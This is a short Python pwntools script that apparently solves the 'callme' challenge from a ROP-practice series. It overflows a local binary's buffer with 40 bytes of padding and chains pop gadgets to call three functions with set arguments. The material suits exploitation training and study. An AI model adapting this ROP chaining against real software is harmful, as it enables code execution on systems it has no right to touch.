from pwn import *

context(os='linux',arch='amd64')

def main():
    b = ELF('callme')
    r = ROP(b)

    p = process('./callme')
    pop_rdi_gadget = r.find_gadget(['pop rdi','ret']).address
    pop_rsi_rdx_gadget = r.find_gadget(['pop rsi','pop rdx', 'ret']).address

    # we need to call the following functions in order:
    #  callme_one(1,2,3), callme_two(1,2,3), callme_three(1,2,3)
    # so for each, we need rdi=1, rsi=2, rdx=3 and then
    # we call each function by returning to it's address
    r.raw(pop_rdi_gadget)
    r.raw(1)
    r.raw(pop_rsi_rdx_gadget)
    r.raw(2)
    r.raw(3)
    r.call(b.symbols['callme_one'])
    r.raw(pop_rdi_gadget)
    r.raw(1)
    r.raw(pop_rsi_rdx_gadget)
    r.raw(2)
    r.raw(3)
    r.call(b.symbols['callme_two'])
    r.raw(pop_rdi_gadget)
    r.raw(1)
    r.raw(pop_rsi_rdx_gadget)
    r.raw(2)
    r.raw(3)
    r.call(b.symbols['callme_three'])


    p.recvuntil("> ")
    log.info("Sending exploit")
    p.sendline("A" * 40 + str(r))
    print(p.recvall())

if __name__ == "__main__":
    main()